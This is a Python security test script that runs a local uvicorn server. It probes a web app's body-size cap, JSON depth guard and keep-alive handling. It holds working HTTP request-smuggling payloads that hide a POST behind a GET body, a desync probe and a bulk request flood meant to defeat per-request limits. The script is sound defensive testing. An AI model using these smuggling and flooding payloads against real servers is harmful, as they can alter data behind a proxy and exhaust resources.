#!/usr/bin/env python3
"""ATK-5 re2-4: GET with a body bypasses the 2 MiB cap -- and then what?

`LocalBoundaryMiddleware` decides whether to read and cap the body with:
    has_body = method in BODY_METHODS or "transfer-encoding" in headers
`BODY_METHODS == {POST, PUT, PATCH, DELETE}`.  A GET that declares a
`Content-Length` is therefore NEVER read, never capped, and never depth-checked.

On its own that is only a missed cap: the bytes are not buffered, so there is no
memory amplification.  The interesting question is what an UNREAD body does to a
keep-alive connection -- if the server treats the leftover body bytes as the next
request, that is request smuggling, and it would sit in front of every defence in
the app.

Real uvicorn socket, isolated temp DB, idempotent. No real network.
"""
import os
import sys
import time
import socket
import threading
import logging

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

import tests.test_setup  # FIRST                    # noqa: E402
from backend.api import app  # noqa: E402
from backend.db import get_db  # noqa: E402
import uvicorn  # noqa: E402

PORT = 39449
logging.getLogger("uvicorn.error").setLevel(logging.CRITICAL)
srv = uvicorn.Server(uvicorn.Config(app, host="127.0.0.1", port=PORT,
                                    log_level="critical", access_log=False))
threading.Thread(target=srv.run, daemon=True).start()
for _ in range(600):
    try:
        socket.create_connection(("127.0.0.1", PORT), 0.2).close()
        break
    except OSError:
        time.sleep(0.05)
time.sleep(0.4)
print(f"real uvicorn on {PORT}\n")
LOCAL = f"127.0.0.1:{PORT}"


def talk(payload: bytes, read_s=8.0, chunked=False):
    """Send raw bytes on ONE connection; return (text, number of responses)."""
    s = socket.create_connection(("127.0.0.1", PORT), 5)
    s.settimeout(read_s)
    try:
        try:
            s.sendall(payload)
        except (BrokenPipeError, ConnectionResetError):
            pass
        buf = b""
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                buf += c
        except socket.timeout:
            buf += b"<TIMEOUT>"
        except (ConnectionResetError, OSError):
            pass
    finally:
        s.close()
    return buf


def statuses(buf: bytes):
    return [ln.split(b" ")[1].decode("latin-1")
            for ln in buf.split(b"\r\n") if ln.startswith(b"HTTP/1.1 ")]


print("=" * 78)
print("[1] the cap itself: GET with a body, vs POST with the same body")
print("=" * 78)
big = b"x" * (3 * 1024 * 1024)
for verb in ("GET", "POST"):
    req = (f"{verb} /api/settings HTTP/1.1\r\nHost: {LOCAL}\r\n"
           f"Content-Type: application/json\r\nContent-Length: {len(big)}\r\n"
           f"Connection: close\r\n\r\n").encode() + big
    buf = talk(req, read_s=20)
    print(f"    {verb:5} with a 3 MiB Content-Length -> {statuses(buf) or ['<none>']}")

print("\n    and the depth guard on a GET (a POST would be refused at 400):")
deep = ("[" * 4000 + "]" * 4000).encode()
for verb in ("GET", "POST"):
    req = (f"{verb} /api/settings HTTP/1.1\r\nHost: {LOCAL}\r\n"
           f"Content-Type: application/json\r\nContent-Length: {len(deep)}\r\n"
           f"Connection: close\r\n\r\n").encode() + deep
    buf = talk(req, read_s=20)
    st = statuses(buf) or ["<none>"]
    print(f"    {verb:5} with a 4000-deep JSON body   -> {st}")

print("\n" + "=" * 78)
print("[2] SMUGGLING: does the unread GET body desynchronise a keep-alive connection?")
print("=" * 78)
print("    A front-end proxy that routes on the request line would see request #1")
print("    (the GET) and request #2 (the smuggled POST) as two separate requests.")
smuggle = (
    f"GET /api/settings HTTP/1.1\r\nHost: {LOCAL}\r\n"
    f"Content-Type: application/json\r\nContent-Length: 44\r\n"
    f"Connection: keep-alive\r\n\r\n"
).encode() + b'{"x":"y"}' + b"PADDINGPADDINGPADDINGPADDING!!" + (
    f"POST /api/repertoire/clear HTTP/1.1\r\nHost: {LOCAL}\r\n"
    f"Content-Type: application/json\r\nContent-Length: 2\r\n"
    f"Connection: close\r\n\r\n{{}}"
).encode()
buf = talk(smuggle, read_s=10)
st = statuses(buf)
print(f"    responses on the connection: {st}  (2 responses = the smuggled POST was")
print(f"    routed as a real request; 1 = the body was drained/discarded)")

# Did the smuggled POST actually execute?  Seed an observable first.
c = get_db()
c.execute("DELETE FROM settings WHERE key='atk5_smuggle'")
c.commit()
c.close()
smuggle2 = (
    f"GET /api/settings HTTP/1.1\r\nHost: {LOCAL}\r\n"
    f"Content-Type: application/json\r\nContent-Length: 40\r\n"
    f"Connection: keep-alive\r\n\r\n"
).encode() + b'{"a":"b"}' + b"X" * 15 + (
    f"POST /api/settings HTTP/1.1\r\nHost: {LOCAL}\r\n"
    f"Content-Type: application/json\r\n"
    f"Content-Length: 33\r\nConnection: close\r\n\r\n"
    f'{{"lichess_username":"atk5_smuggle"}}'
).encode()
buf = talk(smuggle2, read_s=10)
print(f"    second attempt, statuses: {statuses(buf)}")
cc = get_db()
row = cc.execute("SELECT value FROM settings WHERE key='lichess_username'").fetchone()
got = row[0] if row else None
print(f"    lichess_username now: {got!r}  "
      f"({'SMUGGLED' if got == 'atk5_smuggle' else 'not smuggled'})")
if got == "atk5_smuggle":
    cc.execute("UPDATE settings SET value='' WHERE key='lichess_username'")
    cc.commit()
cc.close()

print("\n" + "=" * 78)
print("[3] does the unread body desynchronise a Content-Length:0 keep-alive pair?")
print("=" * 78)
# Control: a well-formed keep-alive pair with no body must give exactly 2 responses.
ctl = (f"GET /api/settings HTTP/1.1\r\nHost: {LOCAL}\r\nContent-Length: 0\r\n"
       f"Connection: keep-alive\r\n\r\n"
       f"GET /api/settings HTTP/1.1\r\nHost: {LOCAL}\r\nContent-Length: 0\r\n"
       f"Connection: close\r\n\r\n").encode()
print(f"    control (two clean GETs)      -> {statuses(talk(ctl, read_s=8))}")

# Now: a GET whose declared body is SHORTER than the bytes actually sent, so the
# surplus is left in the socket buffer as the putative next request.
desync = (f"GET /api/settings HTTP/1.1\r\nHost: {LOCAL}\r\n"
          f"Content-Type: application/json\r\nContent-Length: 2\r\n"
          f"Connection: keep-alive\r\n\r\n").encode() + b"{}" + (
    f"GET /api/reconnaissance-probe HTTP/1.1\r\nHost: {LOCAL}\r\n"
    f"Content-Length: 0\r\nConnection: close\r\n\r\n").encode()
st = statuses(talk(desync, read_s=8))
print(f"    under-declared GET body       -> {st}  "
      f"({'DESYNC' if len(st) >= 2 else 'no desync'})")

print("\n" + "=" * 78)
print("[4] cumulative: many SMALL capped requests (defeat per-request limits)")
print("=" * 78)
t0 = time.time()
N = 400
ok = 0
s = socket.create_connection(("127.0.0.1", PORT), 5)
s.settimeout(10)
body = b'{"name":"' + b"A" * 200000 + b'","repertoire":"white"}'   # 200 KB: under the cap
req = (f"POST /api/repertoire/studies HTTP/1.1\r\nHost: {LOCAL}\r\n"
       f"Content-Type: application/json\r\nContent-Length: {len(body)}\r\n\r\n").encode() + body
try:
    for _ in range(N):
        s.sendall(req)
        buf = b""
        while b"\r\n\r\n" not in buf:
            c = s.recv(65536)
            if not c:
                break
            buf += c
        if b" 422 " in buf.split(b"\r\n")[0] or b" 400 " in buf.split(b"\r\n")[0]:
            ok += 1
except Exception as e:
    print(f"    stopped after {ok} responses: {type(e).__name__}: {str(e)[:80]}")
s.close()
dt = time.time() - t0
print(f"    {N} x 200 KB requests (each individually legal) in {dt:.2f}s")
print(f"    bytes pushed at the server    : {N * len(body) / 1e6:.1f} MB")
print(f"    responses accounted for       : {ok}/{N}")
c = get_db()
c.execute("DELETE FROM repertoire_studies WHERE name LIKE 'AAAA%'")
c.commit()
c.close()

srv.should_exit = True
time.sleep(0.5)
print("\ndone.")
